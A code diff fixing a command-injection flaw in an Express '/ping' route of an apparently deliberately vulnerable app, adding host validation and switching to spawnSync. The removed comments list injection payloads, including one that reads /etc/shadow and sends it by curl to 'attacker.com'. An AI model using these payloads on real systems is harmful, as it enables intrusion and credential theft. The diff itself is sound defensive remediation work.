@@ -9,15 +9,28 @@
 
 const express = require('express');
 const router = express.Router();
-const { execSync } = require('child_process');
+const { execSync, spawnSync } = require('child_process');
 const { parseString } = require('xml2js');
 const jwt = require('jsonwebtoken');
 const fs = require('fs');
 const zlib = require('zlib');
 
+// Helper function to validate IP address or hostname
+function isValidHost(host) {
+  // Allow only valid IPv4, IPv6 addresses or hostnames
+  // IPv4 regex
+  const ipv4Regex = /^(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)){3}$/;
+  // IPv6 basic regex (simplified)
+  const ipv6Regex = /^([\da-fA-F]{1,4}:){7}[\da-fA-F]{1,4}$/;
+  // Hostname regex: labels separated by dots, letters, digits, hyphens; max 63 chars per label
+  const hostnameRegex = /^(?=.{1,253}$)(?!-)[a-zA-Z0-9-]{1,63}(?<!-)(\.(?!-)[a-zA-Z0-9-]{1,63}(?<!-))*\.?$/;
+
+  return ipv4Regex.test(host) || ipv6Regex.test(host) || hostnameRegex.test(host);
+}
+
 // VULN #48: Command Injection (CWE-78)
-// User-supplied hostname is passed directly to shell command
-// without any sanitization or validation
+// Fixed by validating the 'host' to allow only safe hostnames or IPs
+// and replacing execSync with spawnSync passing args as an array to prevent shell injection
 router.get('/ping', (req, res) => {
   const { host } = req.query;
 
@@ -25,26 +38,34 @@ router.get('/ping', (req, res) => {
     return res.status(400).json({ error: 'Host parameter required' });
   }
 
+  if (!isValidHost(host)) {
+    return res.status(400).json({ error: 'Invalid host parameter' });
+  }
+
   try {
-    // VULNERABLE: Direct string interpolation into shell command
-    // Attacker: /api/diagnostics/ping?host=google.com;cat /etc/passwd
-    // Attacker: /api/diagnostics/ping?host=$(whoami)
-    // Attacker: /api/diagnostics/ping?host=127.0.0.1 && curl attacker.com/steal?data=$(cat /etc/shadow)
-    const output = execSync(`ping -c 3 ${host}`, {
-      timeout: 10000,
-      encoding: 'utf-8',
-    });
+    // Security fix: Use spawnSync with args array to prevent command injection
+    const result = spawnSync('ping', ['-c', '3', host], { timeout: 10000, encoding: 'utf-8' });
+
+    if (result.error) {
+      throw result.error;
+    }
+    if (result.status !== 0) {
+      // Child process exited with error code
+      return res.status(500).json({
+        error: 'Ping failed',
+        details: result.stderr || 'Unknown error',
+      });
+    }
 
     res.json({
       host: host,
-      result: output,
+      result: result.stdout,
       timestamp: new Date().toISOString(),
     });
   } catch (err) {
     res.status(500).json({
       error: 'Ping failed',
-      details: err.stderr || err.message,
-      command: `ping -c 3 ${host}`,  // Leaks the executed command
+      details: err.message,
     });
   }
 });
